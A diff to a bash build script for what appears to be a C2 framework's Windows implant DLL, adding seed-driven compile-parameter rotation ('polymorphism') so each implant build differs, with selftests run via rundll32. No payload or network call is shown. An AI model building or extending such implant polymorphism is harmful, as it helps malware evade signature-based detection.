@@ -9,12 +9,43 @@
 # no git/python/mingw), so we SCP the fresh DLL there and drive the 8 selftest
 # exports via rundll32 (scripts/remote_tests.py).
 #
+# Polymorphism L1 (compile-parameter rotation) — template build side ONLY.
+# generate-implant stays "precompiled template + generate-time patch" and must
+# not grow a cargo build.
+#
+#   NYX_BUILD_SEED  optional u64 (decimal or hex, optional 0x prefix).
+#   Unset           this script is byte-identical to the historical default
+#                   (crates/implant-win/Cargo.toml [profile.release]:
+#                   opt-level="z", codegen-units=1, lto=true). No extra env.
+#   Set             eval scripts/poly_seed.sh →
+#                   CARGO_PROFILE_RELEASE_OPT_LEVEL ∈ {3,s,z}
+#                   CARGO_PROFILE_RELEASE_CODEGEN_UNITS ∈ {16,1}
+#                   NEVER sets CARGO_PROFILE_RELEASE_LTO (especially not fat).
+#                   Fat LTO swallowed .nyx_cfg patches (commit b94a158) and
+#                   produced dead implants that C2'd to 127.0.0.1.
+#   Gate            every new param combo MUST pass nyx_selftest_cfgstage
+#                   before it is a supported template. Do not add a CI matrix
+#                   of all combos here; mapping coverage lives in
+#                   crates/config/src/poly.rs tests.
+#
+# L3 (non-executable .rdata junk) is emitted by implant-core/build.rs when
+# the same NYX_BUILD_SEED is set; unset omits the blob so default templates
+# stay stable.
+#
 # Usage:   bash scripts/win_build.sh
 # Exit:    0 if the build succeeded AND all 8 selftests hit their expected codes.
 set -euo pipefail
 
 ROOT="$(cd "$(dirname "$0")/.." && pwd)"
 cd "$ROOT"
+
+if [[ ${NYX_BUILD_SEED+x} ]]; then
+    echo "==> [poly L1] NYX_BUILD_SEED compile-parameter rotation"
+    eval "$(bash "$ROOT/scripts/poly_seed.sh" "$NYX_BUILD_SEED")"
+    echo "    CARGO_PROFILE_RELEASE_OPT_LEVEL=${CARGO_PROFILE_RELEASE_OPT_LEVEL}"
+    echo "    CARGO_PROFILE_RELEASE_CODEGEN_UNITS=${CARGO_PROFILE_RELEASE_CODEGEN_UNITS}"
+    echo "    LTO untouched (never fat; nyx_selftest_cfgstage is the gate)"
+fi
 
 DLL="crates/implant-win/target/x86_64-pc-windows-gnu/release/nyx_implant_win.dll"
 
